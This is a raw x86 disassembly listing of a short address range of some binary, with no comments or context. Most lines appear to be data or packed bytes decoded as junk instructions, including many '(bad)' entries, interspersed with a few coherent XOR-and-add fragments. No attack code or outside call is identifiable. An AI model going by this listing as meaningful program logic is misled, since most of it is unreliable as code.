  416d1c:	mov    ch,0xb3
  416d1e:	push   edi
  416d1f:	jae    0x416d46
  416d21:	ins    DWORD PTR es:[edi],dx
  416d22:	popa   
  416d23:	pushf  
  416d24:	and    eax,edx
  416d26:	and    DWORD PTR ds:0xb479333,ecx
  416d2c:	icebp  
  416d2d:	xchg   DWORD PTR [eax],ebp
  416d2f:	aad    0xb0
  416d31:	fsubr  DWORD PTR [eax-0x66132da5]
  416d37:	(bad)  
  416d38:	push   cs
  416d39:	xor    BYTE PTR [esi-0x6b5be3d0],bh
  416d3f:	repnz in eax,dx
  416d41:	(bad)  
  416d42:	cmc    
  416d43:	fisub  DWORD PTR [edi]
  416d45:	dec    edi
  416d46:	sbb    al,BYTE PTR ds:0x8d2fac01
  416d4c:	xor    BYTE PTR [eax+0x19],al
  416d4f:	adc    BYTE PTR [esi+0x59],bl
  416d52:	into   
  416d53:	lock xor BYTE PTR [ebx+ebp*4],dl
  416d57:	inc    edi
  416d58:	inc    ebp
  416d59:	sbb    edi,esp
  416d5b:	je     0x416d49
  416d5d:	sahf   
  416d5e:	in     al,0x0
  416d60:	dec    edx
  416d61:	inc    edx
  416d62:	outs   dx,DWORD PTR ds:[esi]
  416d63:	pop    eax
  416d64:	lods   eax,DWORD PTR ds:[esi]
  416d65:	out    0x19,al
  416d67:	or     al,0x9b
  416d69:	sub    ah,BYTE PTR [edi+eiz*2+0x4ac81d16]
  416d70:	push   esi
  416d71:	mov    eax,0x40afe495
  416d76:	icebp  
  416d77:	mov    bh,dh
  416d79:	enter  0x4d8b,0x10
  416d7d:	xor    eax,edi
  416d7f:	add    eax,esi
  416d81:	cmp    eax,ecx
  416d83:	jne    0x41731c
  416d89:	mov    eax,DWORD PTR [ebp-0x4]
  416d8c:	xor    eax,edi
  416d8e:	add    eax,esi
  416d90:	mov    ds:0x41eb6a,eax
  416d95:	mov    eax,DWORD PTR [ebp-0x4]
  416d98:	xor    eax,edi
  416d9a:	jmp    0x417052
  416d9f:	xlat   BYTE PTR ds:[ebx]
  416da0:	cmp    eax,0xd9dac7cc
  416da5:	fcmovne st,st(5)
  416da7:	push   ecx
  416da8:	call   0x17e1:0xd5ec1efb
  416daf:	sub    BYTE PTR ds:0x7e95787f,ah
  416db5:	js     0x416e2f
  416db7:	test   al,0x92
  416db9:	(bad)  
  416dba:	in     eax,dx
  416dbb:	xchg   BYTE PTR [edi+0x34653933],ah
  416dc1:	fist   DWORD PTR [eax+0x45c019bb]
  416dc7:	ins    DWORD PTR es:[edi],dx
  416dc8:	test   DWORD PTR [ebx+0x2b269d77],0xebad9edf
  416dd2:	dec    ebx
  416dd3:	aas    
  416dd4:	imul   al
  416dd6:	mov    ds:0x32d990bb,eax
  416ddb:	pop    ebx
  416ddc:	pop    es
  416ddd:	ss ins DWORD PTR es:[edi],dx
  416ddf:	rcr    DWORD PTR [ebx],cl
  416de1:	pop    es
  416de2:	or     ebp,ebp
  416de4:	scas   al,BYTE PTR es:[edi]
  416de5:	push   cs
  416de6:	sbb    al,0x93
  416de8:	cmp    eax,0x374624f6
  416ded:	je     0x416d6f
  416def:	jae    0x416e48
  416df1:	mov    ecx,DWORD PTR [eax-0x78]
  416df4:	pusha  
  416df5:	test   DWORD PTR [esi],ebx
  416df7:	jmp    0x3707:0x76cefe9f
  416dfe:	lock aad 0xd
  416e01:	je     0x416db0
  416e03:	(bad)  
  416e04:	aam    0x73
  416e06:	or     BYTE PTR [esi-0x7b],bl
  416e09:	inc    edi
  416e0a:	sar    BYTE PTR fs:0x6388b66d,0x30
  416e12:	mov    BYTE PTR [ebp+esi*8+0x7a30dc9f],dl
  416e19:	mov    dh,0x76
  416e1b:	mov    dl,0x62
  416e1d:	push   esp
  416e1e:	sbb    al,ch
  416e20:	out    0x15,al
  416e22:	mov    DWORD PTR [edx],ecx
  416e24:	pop    eax
  416e25:	jae    0x416e24
  416e27:	push   cs
  416e28:	jle    0x416e41
  416e2a:	pop    edx
  416e2b:	or     al,0xd9
  416e2d:	sbb    DWORD PTR ds:0x7a7b1b5b,esp
  416e33:	inc    esp
  416e34:	jle    0x416dfb
  416e36:	add    ch,bh
  416e38:	jl     0x416dbb
  416e3a:	or     DWORD PTR [eax],0x991b0be6
  416e40:	outs   dx,BYTE PTR ds:[esi]
  416e41:	iret   
  416e42:	mov    edx,ebp
  416e44:	xchg   ebx,eax
  416e45:	jb     0x416df0
  416e47:	ror    BYTE PTR [edi+ecx*2],1
  416e4a:	jno    0x416de5
  416e4c:	clc    
  416e4d:	xchg   ebp,eax
  416e4e:	sti    
  416e4f:	arpl   WORD PTR [eax],bx
  416e51:	aam    0xd3
  416e53:	xchg   ebx,eax
  416e54:	sbb    DWORD PTR [ecx+0x5d498255],esp
  416e5a:	or     esi,DWORD PTR [edx]
  416e5c:	fimul  WORD PTR [ecx+0x54c9fb37]
  416e62:	jge    0x416e0d
  416e64:	push   esp
  416e65:	stc    
  416e66:	bound  ebp,QWORD PTR [edi-0x50436845]
  416e6c:	sub    BYTE PTR [bp+si],ch
  416e6f:	mov    dh,0x16
  416e71:	mov    ebx,0xa97e4ecc
  416e76:	add    DWORD PTR [eax+0x11],0x4f
  416e7a:	cmp    BYTE PTR [edx+0x1341734b],cl
  416e80:	aam    0x3
  416e82:	dec    eax
  416e83:	dec    esi
  416e84:	sar    DWORD PTR [ebp+eax*4+0x10],cl
  416e88:	or     BYTE PTR [eax-0x70],ch
  416e8b:	jle    0x416e68
  416e8d:	inc    esp
  416e8e:	in     eax,0xf7
  416e90:	nop
  416e91:	aad    0x95
  416e93:	adc    eax,0x691816b3
  416e98:	sti    
  416e99:	jbe    0x416eea
  416e9b:	das    
  416e9c:	mov    ah,al
  416e9e:	cmp    esp,DWORD PTR fs:[esi+0x6625dfbb]
  416ea5:	jo     0x416e76
  416ea7:	cbw    
  416ea9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416eaa:	add    eax,0x147539dc
  416eaf:	xor    ah,BYTE PTR [esi-0x4525d3a2]
  416eb5:	arpl   WORD PTR [eax+ebp*1],bp
  416eb8:	loop   0x416ed8
  416eba:	pop    edi
  416ebb:	mov    ebx,0x30302c0a
  416ec0:	or     cl,bh
  416ec2:	out    0xf2,al
  416ec4:	push   edx
  416ec5:	jmp    DWORD PTR [ecx]
  416ec7:	adc    dh,cl
  416ec9:	pop    ds
  416eca:	jl     0x416e69
  416ecc:	add    al,0x3d
  416ece:	ficomp DWORD PTR [ebp+0x5]
  416ed1:	sbb    bl,BYTE PTR [ebx+0x50]
  416ed4:	mov    dl,0xc1
  416ed6:	scas   al,BYTE PTR es:[edi]
  416ed7:	add    ecx,DWORD PTR [eax+eiz*4+0xda989f2]
  416ede:	jle    0x416ed4
  416ee0:	popa   
  416ee1:	in     eax,0x20
  416ee3:	add    DWORD PTR [edx-0x779f8d9e],0x5892334d
  416eed:	fadd   QWORD PTR [edx-0x72]
  416ef0:	fsubp  st(0),st
  416ef2:	mov    WORD PTR [edx-0x43],ss
  416ef5:	sub    DWORD PTR [eax],ebx
  416ef7:	ror    edi,0x9
  416efa:	jg     0x416f21
  416efc:	aaa    
  416efd:	xchg   ebx,eax
  416efe:	test   eax,0x104e32df
  416f03:	adc    eax,0x5d4b4548
  416f08:	test   al,0xa3
  416f0a:	add    eax,0x561feb2d
  416f0f:	mov    esi,0x35df26a5
  416f14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f15:	mov    WORD PTR [edi-0x10],?
  416f18:	fisttp DWORD PTR [ebx+0x353249ee]
  416f1e:	sahf   
  416f1f:	push   ds
  416f20:	retf   0xfcda
  416f23:	jno    0x416eda
  416f25:	jno    0x416ef7
  416f27:	push   edx
  416f28:	pop    edi
  416f29:	adc    edx,ebx
  416f2b:	popa   
  416f2c:	xor    al,0x14
  416f2e:	cmp    BYTE PTR [ebx-0x4e1b2e5b],0xbd
  416f35:	ins    BYTE PTR es:[edi],dx
  416f36:	cmp    al,0xed
  416f38:	adc    al,0x8d
  416f3a:	add    ch,BYTE PTR [ecx-0x6]
  416f3d:	inc    ebx
  416f3e:	push   esp
  416f3f:	(bad)  
  416f40:	shl    DWORD PTR ds:0x4cbb80f3,cl
  416f46:	js     0x416f3f
  416f48:	jo     0x416f9d
  416f4a:	cs mov ebp,0x1cab49ec
  416f50:	in     al,0x8d
  416f52:	sar    BYTE PTR [eax+0x2d057072],cl
  416f58:	adc    BYTE PTR [ebx+0x4bab3030],ch
  416f5e:	jmp    0x5897d230
  416f63:	fdivr  st,st(5)
  416f65:	test   al,0x8d
  416f67:	pop    eax
  416f68:	xor    al,0x39
  416f6a:	inc    eax
  416f6b:	aad    0xfd
  416f6d:	add    al,0xb1
  416f6f:	test   al,0x7d
  416f71:	shl    esp,0x26
  416f74:	mov    ch,al
  416f76:	icebp  
  416f77:	pop    es
  416f78:	or     dl,BYTE PTR [edx]
  416f7a:	gs cmp cl,cl
  416f7d:	out    dx,eax
  416f7e:	pop    eax
  416f7f:	(bad)  
  416f80:	sbb    eax,0x2b8476ae
  416f85:	xor    al,0x62
  416f87:	push   ebx
  416f88:	mov    ah,0xf0
  416f8a:	ds ret 0x70a2
  416f8e:	xchg   edx,eax
  416f8f:	enter  0x1e49,0x8d
  416f93:	xchg   BYTE PTR [eax+0x32f890ff],dh
  416f99:	addr16 mov al,0x74
  416f9c:	inc    esp
  416f9d:	daa    
  416f9e:	pop    esp
  416f9f:	jmp    0x84fb:0x5cb9e70b
  416fa6:	xor    DWORD PTR [ecx+0x7f],esp
  416fa9:	into   
  416faa:	retf   
  416fab:	pushf  
  416fac:	stos   BYTE PTR es:[edi],al
  416fad:	adc    edi,ebx
  416faf:	jns    0x417026
  416fb1:	test   DWORD PTR [ebp-0x6a],0x5916c6a6
  416fb8:	or     ecx,ebp
  416fba:	hlt    
  416fbb:	scas   eax,DWORD PTR es:[edi]
  416fbc:	push   edx
  416fbd:	cs xchg bl,cl
  416fc0:	stos   BYTE PTR es:[edi],al
  416fc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416fc2:	int    0x97
  416fc4:	and    esp,DWORD PTR [eax-0x73]
  416fc7:	mov    al,ds:0x57b5abd9
  416fcc:	ret    
  416fcd:	dec    edi
  416fce:	outs   dx,BYTE PTR ds:[esi]
  416fcf:	push   eax
  416fd0:	std    
  416fd1:	cdq    
  416fd2:	and    DWORD PTR [edx],0x881a5a4c
  416fd8:	lea    ecx,[ebx+0x74]
  416fdb:	mov    ah,0xfa
  416fdd:	shl    DWORD PTR [edi+esi*2-0xf5aa471],0xa3
  416fe5:	xchg   ecx,eax
  416fe6:	(bad)  [eax-0x5d]
  416fe9:	fsubr  QWORD PTR [ebx-0x5dd759b0]
  416fef:	adc    BYTE PTR [ebx*4-0x74ce37b6],dl
  416ff6:	(bad)  
  416ff8:	dec    esp
  416ff9:	and    al,0xd1
  416ffb:	test   al,0x4f
  416ffd:	jbe    0x416fc1
  416fff:	out    0x94,eax
  417001:	sbb    al,0xa4
  417003:	iret   
  417004:	push   0xffffffe8
  417006:	mov    DWORD PTR [edi-0x3c],edi
  417009:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41700a:	ja     0x416fe1
  41700c:	cmp    edi,edi
  41700e:	mov    ebp,0x3307edbe
  417013:	fidiv  DWORD PTR [eax+0x6f]
  417016:	dec    ebp
  417017:	in     eax,0x8f
  417019:	in     al,dx
  41701a:	and    ax,0x7f2f
  41701e:	cmp    DWORD PTR [edi-0x48d9390d],ecx
  417024:	imul   esp,DWORD PTR [ecx-0x56135e6f],0x2b
  41702b:	shl    BYTE PTR [eax+eax*4-0x471f6e50],0x22
  417033:	sub    eax,0x3e8ff6fd
  417038:	jmp    0x903:0x3920c189
  41703f:	or     eax,0x3693b452
  417044:	iret   
  417045:	jo     0x417036
  417047:	adc    BYTE PTR [ebx+0x4130000a],dl
  41704d:	adc    eax,0x751b09e4
  417052:	add    eax,esi
  417054:	mov    ds:0x41eb62,eax
  417059:	jmp    0x417311
  41705e:	ret    
  41705f:	xlat   BYTE PTR ds:[ebx]
  417060:	leave  
  417061:	rcr    ecx,cl
  417063:	rcr    ecx,1
  417065:	xlat   BYTE PTR ds:[ebx]
  417066:	(bad)  
  417067:	cmp    DWORD PTR [edi-0xcded145],edx
  41706d:	fwait
  41706e:	inc    ebp
  41706f:	sub    edi,DWORD PTR [edi+0x78]
  417072:	xchg   ebp,eax
  417073:	jle    0x4170ed
  417075:	js     0x417010
  417077:	xchg   DWORD PTR [edi+ecx*4],ebx
  41707a:	xlat   BYTE PTR ds:[ebx]
  41707b:	push   edx
  41707c:	in     al,0x28
  41707e:	dec    edx
  41707f:	call   0x8ee2:0xcb5c7ed6
  417086:	or     dh,BYTE PTR [eax-0x39]
  417089:	pop    ecx
  41708a:	aaa    
  41708b:	jmp    0x427c072d
  417090:	pop    eax
  417091:	jbe    0x417069
  417093:	(bad)  
  417094:	pop    esi
  417095:	dec    esp
  417096:	(bad)  
  417097:	xor    DWORD PTR [ecx+0x679746a5],eax
  41709d:	repnz or dh,bl
  4170a0:	push   edi
  4170a1:	scas   eax,DWORD PTR es:[edi]
  4170a2:	aaa    
  4170a3:	inc    ecx
  4170a4:	sub    esp,DWORD PTR [ebx+edx*2+0x4662cdc4]
  4170ab:	call   0xd76389c7
  4170b0:	jge    0x4170c5
  4170b2:	adc    al,0x38
  4170b4:	pop    esp
  4170b5:	jp     0x4170a6
  4170b7:	and    BYTE PTR [edx+0xe],al
  4170ba:	imul   eax,DWORD PTR [ecx+0x42ba66ed],0x2
  4170c1:	sub    al,0x65
  4170c3:	xchg   ebx,eax
  4170c4:	inc    eax
  4170c5:	jmp    DWORD PTR [edx]
  4170c7:	pop    ebx
  4170c8:	imul   ebx,DWORD PTR [esi],0xdb0861f3
  4170ce:	std    
  4170cf:	pop    eax
  4170d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4170d1:	test   BYTE PTR [esi],bh
  4170d3:	xchg   ebp,eax
  4170d4:	cmp    bh,BYTE PTR es:[edx+0x7ad425e]
  4170db:	pop    edx
  4170dc:	test   BYTE PTR [edx+0x60e92d1f],al
  4170e2:	add    al,0x34
  4170e4:	mov    al,ds:0xcbfdb5ff
  4170e9:	and    al,0xc
  4170eb:	mov    eax,0x14c14731
  4170f0:	push   0xffffffa7
  4170f2:	es push edx
  4170f4:	jle    0x4170f1
  4170f6:	iret   
  4170f7:	jae    0x417088
  4170f9:	xchg   edi,eax
  4170fa:	jno    0x4170ab
  4170fc:	mov    ebp,0x8648228b
  417101:	data16 cmp ch,bl
  417104:	int    0xae
  417106:	cli    
  417107:	push   ds
  417108:	and    al,0x7a
  41710a:	aas    
  41710b:	addr16 cli 
  41710d:	gs pop ebx
  41710f:	sbb    cl,BYTE PTR [ecx+0x700b9783]
  417115:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417116:	inc    eax
  417117:	inc    eax
  417118:	adc    ecx,ecx
  41711a:	push   eax
  41711b:	(bad)  
  41711c:	aam    0x54
  41711e:	pushf  
  41711f:	sbb    edx,DWORD PTR ds:0x8b131d80
  417125:	sbb    ebp,DWORD PTR [edx]
  417127:	dec    ecx
  417128:	dec    edi
  417129:	adc    eax,0xde3f346
  41712e:	fwait
  41712f:	pusha  
  417130:	xor    DWORD PTR [eax+0x5],edx
  417133:	inc    esp
  417134:	mov    edi,0x6bcfb328
  417139:	inc    esi
  41713a:	inc    ecx
  41713b:	xor    eax,0xfdf5d607
  417140:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417141:	in     al,dx
  417142:	xor    DWORD PTR [edi+edx*1],edx
  417145:	sbb    ecx,esi
  417147:	pushf  
  417148:	outs   dx,DWORD PTR ds:[esi]
  417149:	(bad)  
  41714a:	rcl    BYTE PTR [edx-0x14dacff0],cl
  417150:	aad    0x6
  417152:	pushf  
  417153:	push   esp
  417154:	inc    eax
  417155:	pop    ebp
  417156:	jl     0x417164
  417158:	mov    dl,0x37
  41715a:	clc    
  41715b:	ins    BYTE PTR es:[edi],dx
  41715c:	cmp    BYTE PTR [ecx+0x23],0xc4
  417160:	pop    esi
  417161:	stc    
  417162:	mov    cl,0x7d
  417164:	xchg   esi,eax
  417165:	push   ebx
  417166:	stos   DWORD PTR es:[edi],eax
  417167:	cmp    DWORD PTR [edi+0x14],0x7f
  41716b:	stos   BYTE PTR es:[edi],al
  41716c:	repnz push ss
  41716e:	stos   BYTE PTR es:[edi],al
  41716f:	inc    ebp
  417170:	inc    esp
  417171:	pop    es
  417172:	xchg   esi,eax
  417173:	mov    eax,ds:0x7cbe69f0
  417178:	jbe    0x41717d
  41717a:	sbb    edx,DWORD PTR [edx]
  41717c:	pushf  
  41717d:	push   0x72
  41717f:	sbb    eax,0x73
  417182:	and    bl,BYTE PTR [ecx]
  417184:	adc    al,0xc3
  417186:	adc    eax,0x6eceb7
  41718b:	mov    BYTE PTR ds:0xc76fc9da,ah
  417191:	and    al,0x71
  417193:	add    bl,BYTE PTR [esi+0x4d6ef7b0]
  417199:	in     al,0xe1
  41719b:	sub    eax,0x38a34d54
  4171a0:	mov    esi,DWORD PTR [edx-0x6368c009]
  4171a6:	addr16 push ebp
  4171a8:	bound  ebp,QWORD PTR [ebx]
  4171aa:	icebp  
  4171ab:	out    dx,al
  4171ac:	test   eax,0x825aabe0
  4171b1:	mov    cl,0xe5
  4171b3:	xor    DWORD PTR [ecx],ecx
  4171b5:	mov    al,0xdd
  4171b7:	loopne 0x4171e8
  4171b9:	xor    DWORD PTR [edx],ebp
  4171bb:	dec    ebp
  4171bc:	jo     0x417142
  4171be:	and    DWORD PTR [ecx+ebp*2-0x15658fae],eax
  4171c5:	xor    al,0x74
  4171c7:	cld    
  4171c8:	cmp    BYTE PTR fs:[edi-0x51],cl
  4171cc:	out    0xea,eax
  4171ce:	inc    edi
  4171cf:	mov    WORD PTR [edx+0x6f],?
  4171d2:	sbb    al,0x63
  4171d4:	adc    DWORD PTR [ebx],esi
  4171d6:	js     0x41718d
  4171d8:	xchg   esp,ebx
  4171da:	xchg   ecx,eax
  4171db:	push   ebp
  4171dc:	mov    edx,0x459efb96
  4171e1:	inc    edi
  4171e2:	xchg   esi,eax
  4171e3:	xchg   esi,eax
  4171e4:	stc    
  4171e5:	adc    al,0x23
  4171e7:	xchg   esp,eax
  4171e8:	sbb    dl,ah
  4171ea:	test   al,0xe9
  4171ec:	cmp    BYTE PTR [esi+0x7b],cl
  4171ef:	jg     0x4171e9
  4171f1:	push   ebx
  4171f2:	enter  0xe7f3,0x33
  4171f6:	dec    BYTE PTR [edx-0x66c45471]
  4171fc:	sub    BYTE PTR [ecx+0x544ad7a8],dh
  417202:	jns    0x41725a
  417204:	ins    DWORD PTR es:[edi],dx
  417205:	call   0xfefb088a
  41720a:	and    BYTE PTR [eax-0x58],dl
  41720d:	cs jmp 0x417287
  417210:	(bad)  
  417212:	js     0x4171e7
  417214:	(bad)  
  417215:	sub    al,0x2e
  417217:	inc    esi
  417218:	xchg   esp,eax
  417219:	push   cs
  41721a:	mov    dh,dl
  41721c:	inc    ebp
  41721d:	loope  0x417232
  41721f:	mov    esp,0xa7acbe8
  417224:	ret    
  417225:	fcomp  st(3)
  417227:	fimul  DWORD PTR [ecx-0x557ceda7]
  41722d:	bound  edx,QWORD PTR [edx+0x29428e62]
  417233:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417234:	push   edx
  417235:	pop    ebx
  417236:	lods   eax,DWORD PTR ds:[esi]
  417237:	lahf   
  417238:	test   al,0xed
  41723a:	mov    eax,ds:0x94696b51
  41723f:	push   ss
  417240:	mov    DWORD PTR [esi],eax
  417242:	xor    BYTE PTR [esi-0x7],dh
  417245:	mov    bl,0x50
  417247:	push   0xffffffda
  417249:	addr16 aam 0x89
  41724c:	(bad)  
  41724d:	fwait
  41724e:	mov    bl,0x86
  417250:	inc    ecx
  417251:	shl    esi,1
  417253:	fnstenv [ecx+0x14]
  417256:	cmp    DWORD PTR [ebp+ecx*2-0x13],ebx
  41725a:	inc    eax
  41725b:	les    ebp,FWORD PTR [ebp-0x3f]
  41725e:	rol    BYTE PTR [eax+0x4],1
  417261:	repz ss jo 0x41727f
  417265:	push   esp
  417266:	shr    ecx,0x91
  417269:	in     al,0x68
  41726b:	enter  0xf95a,0x51
  41726f:	mov    BYTE PTR [edi-0x25],ch
  417272:	(bad)  
  417273:	xlat   BYTE PTR ds:[ebx]
  417274:	mov    bh,BYTE PTR [ecx-0x46]
  417277:	push   ds
  417278:	pop    edi
  417279:	faddp  st(2),st
  41727b:	inc    eax
  41727c:	cmp    edx,DWORD PTR [edi-0x28]
  41727f:	fstp   TBYTE PTR [ecx+0x4d]
  417282:	pushf  
  417283:	jno    0x4172d5
  417285:	sbb    al,dl
  417287:	pop    es
  417288:	pop    ds
  417289:	cdq    
  41728a:	xchg   edx,eax
  41728b:	push   eax
  41728c:	ficomp WORD PTR [ebp+0x66f4fc9d]
  417292:	and    BYTE PTR [edi+ecx*8+0x3b],0x64
  417297:	push   es
  417298:	mov    WORD PTR [ebp+0x4c5d8a91],ds
  41729e:	pop    ds
  41729f:	sbb    DWORD PTR [edi],ebx
  4172a1:	inc    esi
  4172a2:	sbb    eax,0x4b39f8d7
  4172a7:	pop    edx
  4172a8:	lds    esi,FWORD PTR [esi]
  4172aa:	sbb    eax,0xeb8976f6
  4172af:	or     dh,bl
  4172b1:	inc    ebx
  4172b2:	push   eax
  4172b3:	leave  
  4172b4:	and    BYTE PTR [ecx],0x0
  4172b7:	add    al,0xd3
  4172b9:	mov    bh,0x2d
  4172bb:	jnp    0x4172de
  4172bd:	test   BYTE PTR [bx+di-0x3b],0xd0
  4172c2:	out    0x72,eax
  4172c4:	mov    edi,0x12b81709
  4172c9:	rcr    BYTE PTR [ecx+0x16fc0908],1
  4172cf:	mov    BYTE PTR [eax+0x75a25c1f],cl
  4172d5:	xor    edi,0xfffffff3
  4172d8:	dec    ebp
  4172d9:	sbb    edx,DWORD PTR [ebp+0x6a21dc82]
  4172df:	sub    ebp,DWORD PTR [esi]
  4172e1:	mov    dh,0x89
  4172e3:	cdq    
  4172e4:	sbb    DWORD PTR [eax-0x26d2ca0d],eax
  4172ea:	(bad)  
  4172eb:	sti    
  4172ec:	inc    ecx
  4172ed:	sbb    eax,0xf9d25ad7
  4172f2:	add    BYTE PTR [ebx+0x37],bh
  4172f5:	pop    ss
  4172f6:	std    
  4172f7:	sti    
  4172f8:	ret    
  4172f9:	add    al,0xab
  4172fb:	fdiv   DWORD PTR [ecx+ecx*8+0x3d]
  4172ff:	popa   
  417300:	inc    BYTE PTR ds:0xdc23dbb3
  417306:	fwait
  417307:	jae    0x417325
  417309:	push   ecx
  41730a:	jecxz  0x41736b
  41730c:	cmp    BYTE PTR [edi-0x999f53],al
  417312:	jne    0x41730c
  417314:	push   DWORD PTR [ebp-0x4]
  417317:	call   0x40cf9c
  41731c:	mov    eax,DWORD PTR [ebp-0x4]
  41731f:	xor    eax,edi
  417321:	pop    edi
  417322:	jmp    0x4175da
  417327:	rcl    bl,cl
  417329:	rcl    esi,cl
  41732b:	rcl    esi,1
  41732d:	(bad)  
  41732f:	and    esi,DWORD PTR [ebp+0x49]
  417332:	sar    BYTE PTR [ecx-0x27],1
  417335:	pop    esi
  417336:	mov    eax,0x787f28e2
  41733b:	xchg   ebp,eax
  41733c:	jle    0x4173b6
  41733e:	js     0x417304
  417340:	jb     0x417363
  417342:	stos   DWORD PTR es:[edi],eax
  417343:	mov    al,ds:0x625f0dde
  417348:	call   0xb66d634c
  41734d:	push   ss
  41734e:	or     eax,0xc98259f5
  417353:	pop    ebp
  417354:	xor    DWORD PTR [eax-0x62],edx
  417357:	pop    ebp
  417358:	push   esi
  417359:	push   ecx
  41735a:	ins    BYTE PTR es:[edi],dx
  41735b:	rcr    ch,1
  41735d:	shr    DWORD PTR [eax+0x38f27035],0x58
  417364:	dec    esp
  417365:	mov    edx,0x1a50b144
  41736a:	xor    DWORD PTR [ecx-0x78],esp
  41736d:	aad    0xc1
  41736f:	(bad)  
  417370:	stc    
  417371:	test   DWORD PTR [edi-0x5f59c366],eax
  417377:	adc    ecx,DWORD PTR [ecx+eiz*1+0x6]
  41737b:	jbe    0x4173a7
  41737d:	ret    
  41737e:	mov    ah,0x20
  417380:	xchg   BYTE PTR [edx],dl
  417382:	xchg   ebx,eax
  417383:	pop    ss
  417384:	sar    BYTE PTR [edi+ebp*1-0x791a9e04],0xc5
  41738c:	jmp    0x417329
  41738e:	arpl   WORD PTR [ebx],sp
  417390:	jl     0x417354
  417392:	bound  esp,QWORD PTR [edx]
  417394:	dec    ecx
  417395:	out    0xfc,al
  417397:	cli    
  417398:	dec    ebx
  417399:	adc    al,dl
  41739b:	jge    0x41736d
  41739d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41739e:	sub    dl,al
  4173a0:	(bad)  
  4173a1:	(bad)  
  4173a2:	dec    ebx
  4173a3:	sub    bl,BYTE PTR [eax+ecx*4]
  4173a6:	mov    eax,ds:0x25a1349e
  4173ab:	cmp    BYTE PTR [esi+edx*8+0x0],ch
  4173af:	test   BYTE PTR [edx],ah
  4173b1:	or     edx,DWORD PTR [ebx+eax*8-0x1473772d]
  4173b8:	stc    
  4173b9:	(bad)  
  4173ba:	aad    0x78
  4173bc:	mov    esi,0xc8f2876f
  4173c1:	jmp    0x574c3ac3
  4173c6:	scas   eax,DWORD PTR es:[edi]
  4173c7:	inc    ebx
  4173c8:	and    al,0xf1
  4173ca:	pop    ebp
  4173cb:	test   DWORD PTR [ebx-0x52],0x9672d665
  4173d2:	out    dx,eax
  4173d3:	in     al,0x16
  4173d5:	(bad)  
  4173d6:	cmp    al,0x92
  4173d8:	sub    dl,cl
  4173da:	xchg   esi,eax
  4173db:	ror    BYTE PTR [edi-0x12],1
  4173de:	or     BYTE PTR [edi+0x1b],bl
  4173e1:	call   0x439db67a
  4173e6:	(bad)  
  4173e7:	cld    
  4173e8:	or     eax,0xa533d33f
  4173ed:	aaa    
  4173ee:	or     BYTE PTR [ebp+0x2cadd62d],ch
  4173f4:	push   ebp
  4173f5:	sub    al,dh
  4173f7:	shl    BYTE PTR [ebx-0x64],0x89
  4173fb:	or     DWORD PTR [ecx],esi
  4173fd:	pop    edx
  4173fe:	das    
  4173ff:	imul   esp,ebx,0x3bd0fb2
  417405:	jle    0x4173d5
  417407:	inc    ecx
  417408:	lahf   
  417409:	sti    
  41740a:	outs   dx,DWORD PTR ds:[esi]
  41740b:	dec    ebp
  41740c:	xchg   ebx,eax
  41740d:	push   edi
  41740e:	shl    BYTE PTR [eax],0x7e
  417411:	mov    ebp,0x6e84ccdf
  417416:	shl    DWORD PTR ds:[ecx+esi*1+0x1c],cl
  41741b:	mov    eax,0x87c279f3
  417420:	out    0x29,al
  417422:	dec    eax
  417423:	call   0xc74d7e31
  417428:	push   esi
  417429:	mov    ds:0x5c13daf3,eax
  41742e:	into   
  41742f:	dec    esi
  417430:	jae    0x41740f
  417432:	lahf   
  417433:	call   0x23dd2fbd
  417438:	frstpm(287 only) 
  41743a:	inc    ebx
  41743b:	pop    eax
  41743c:	mov    eax,ds:0x4d4a05fd
  417441:	mov    cl,0xbe
  417443:	or     eax,0x4daeca27
  417448:	les    esp,FWORD PTR [ecx]
  41744a:	push   0x33
  41744c:	rol    DWORD PTR [ecx-0x4db9d91b],0x20
  417453:	mov    edi,0x5b46930a
  417458:	lods   eax,DWORD PTR ds:[esi]
  417459:	add    BYTE PTR [eax-0x72],bl
  41745c:	aaa    
  41745d:	retf   
  41745e:	mov    ds:0x553d81f8,eax
  417463:	pop    esi
  417464:	and    BYTE PTR [ebp+0x5e7927e1],ah
  41746a:	dec    esp
  41746b:	inc    edx
  41746c:	jne    0x4173f3
  41746e:	(bad)  
  417470:	loopne 0x417471
  417472:	push   es
  417473:	pop    ds
  417474:	pop    es
  417475:	out    0xfa,eax
  417477:	mov    WORD PTR [ebp+0x5c],gs
  41747a:	jg     0x417493
  41747c:	adc    al,0xe7
  41747e:	mov    cs,ebp
  417480:	cmp    DWORD PTR ss:[edi-0x77],esi
  417484:	cmp    al,0x70
  417486:	sti    
  417487:	mov    dl,0x47
  417489:	or     bh,BYTE PTR [esi+0x58]
  41748c:	mov    al,0x36
  41748e:	and    al,0x73
  417490:	xor    al,0xf2
  417492:	das    
  417493:	pop    ebp
  417494:	xchg   eax,eax
  417496:	mov    al,ds:0x3624e7d7
  41749b:	or     bl,BYTE PTR [esi+0x37560db0]
  4174a1:	mov    ecx,0x847b6720
  4174a6:	icebp  
  4174a7:	push   0x2f
  4174a9:	sbb    al,0x81
  4174ab:	jno    0x417526
  4174ad:	idiv   BYTE PTR [eax+ecx*4]
  4174b0:	mov    ss,WORD PTR [edx+0x717dff1b]
  4174b6:	test   eax,0x1b1cc0e
  4174bb:	jmp    0x4174a8
  4174bd:	xchg   BYTE PTR [ecx],cl
  4174bf:	das    
  4174c0:	mov    ds:0x96ed12d3,al
  4174c5:	mov    esi,0x4bc615c9
  4174ca:	pusha  
  4174cb:	push   edx
  4174cc:	js     0x417519
  4174ce:	push   eax
  4174cf:	outs   dx,BYTE PTR ds:[esi]
  4174d0:	adc    DWORD PTR [eax],ebx
  4174d2:	popa   
  4174d3:	jns    0x417548
  4174d5:	xor    DWORD PTR [edx-0x7685ee0c],ecx
  4174db:	add    BYTE PTR [esi+0x1b],bl
  4174de:	add    eax,DWORD PTR [ecx]
  4174e0:	into   
  4174e1:	ror    DWORD PTR [ecx],cl
  4174e3:	neg    DWORD PTR [ebx+0x37eb248d]
  4174e9:	retf   
  4174ea:	mov    eax,0xf67b0be
  4174ef:	push   eax
